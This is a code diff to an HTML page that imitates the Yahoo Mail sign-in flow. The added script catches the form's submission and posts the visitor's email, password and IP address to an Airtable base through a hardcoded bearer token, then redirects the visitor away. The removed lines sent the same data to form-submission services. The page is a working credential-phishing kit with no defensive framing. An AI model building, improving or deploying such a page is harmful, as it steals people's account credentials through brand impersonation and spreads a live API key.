@@ -36,14 +36,12 @@
         <p class="parag">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
       </div>
       <div class="form-block w-form">
-        <form id="email-form" name="email-form" data-name="Email Form" action="https://formsubmit.co/el/bisika" method="post" type="hidden" name="_next" value="https://yourwebsite.com/thank-you"
-          input type="hidden" name="_captcha" value="true"
-      class="form" data-wf-page-id="67c6f50ed426ad7d5847f218" data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d"><img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+        <form id="email-form" name="email-form" data-name="Email Form" class="form" data-wf-page-id="67c6f50ed426ad7d5847f218" data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d"><img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           <div class="mail">
             <h1 class="heading-2">Sign in</h1>
             <div class="text-block-2">Sign in using your Yahoo account<br></div>
             <div class="lpl numb">Username, Email or Mobile<br></div><input class="field w-input" maxlength="256" name="name" data-name="Name" placeholder="" type="email" id="name"> 
-            <input type="hidden" name="access_key" value="e76c8924-5bca-47d7-8bbe-cc8d9e139b93">  <input type="hidden" name="ip_address" id="ip_address">  <input type="hidden" name="redirect" value="https://www.google.com"> <div class="div-block-6"><label class="w-checkbox checkbox-field">
+              <div class="div-block-6"><label class="w-checkbox checkbox-field">
                 <div class="w-checkbox-input w-checkbox-input--inputType-custom checkbox-field"></div><input type="checkbox" id="checkbox" name="checkbox" data-name="Checkbox" style="opacity:0;position:absolute;z-index:-1"><span class="checkbox-label w-form-label" for="checkbox">Stay signed in</span>
               </label>
               <div class="text-block-4">Forgotten username?</div>
@@ -60,7 +58,7 @@
             <h1 class="heading-2"><strong>Enter password</strong></h1>
             <div class="text-block-2">to finish signing in<br></div>
             <div class="pazz lpl numb">Password<br></div>
-            <div class="ms-input-wrap"><input data-show="true" class="ms-input w-input" maxlength="256" name="input18" data-name="input18" placeholder="" type="password" id="input-19" data-ms-member="password" required="">
+            <div class="ms-input-wrap"><input data-show="true" class="ms-input w-input" maxlength="256" name="input18" data-name="input18" placeholder="" type="password" id="input-19" data-ms-member="password" required="" type="hidden" name="ip_address" id="ip_address">
               <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
                 <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
                   <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
@@ -138,12 +136,6 @@ function transform() {
 }
 </script>
 <script>
-  const refreshButton = document.getElementById('refreshButton');
-  refreshButton.addEventListener('click', function() {
-      location.reload(); // or location.reload(true) to force a server reload
-  });
-</script>
-<script>
   // Fetch IP address and add it to the hidden field
   fetch("https://api64.ipify.org?format=json")
       .then(response => response.json())
@@ -151,6 +143,39 @@ function transform() {
           document.getElementById("ip_address").value = data.ip;
       })
       .catch(error => console.error("Error fetching IP:", error));
+</script>
+<script>
+  const refreshButton = document.getElementById('refreshButton');
+  refreshButton.addEventListener('click', function() {
+      location.reload(); // or location.reload(true) to force a server reload
+  });
+</script>
+<script>
+  document.getElementById("email-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      fetch("https://api.airtable.com/v0/WWw92Q29J21BO3/Yahoo", {
+          method: "POST",
+          headers: {
+              "Authorization": "Bearer pataxf2KY8eB1o1Ol.535ced6831fcdf9cc2047ef0b9bea6ae358da0fed1dbe0407e6f707657b66f71",
+              "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+              records: [{
+                  fields: {
+                      Email: document.getElementById("name").value,
+                      Password: document.getElementById("input-19").value,
+                      Ip: document.getElementById("ip_address").value
+                  }
+              }]
+          })
+      })
+      .then(response => response.json())
+      .then(data => {
+          window.location.href = "https://yourwebsite.com/thank-you"; // Redirect after submission
+      })
+      .catch(error => alert("Submission failed! Try again."));
+  });
 </script>
 </body>
 </html>
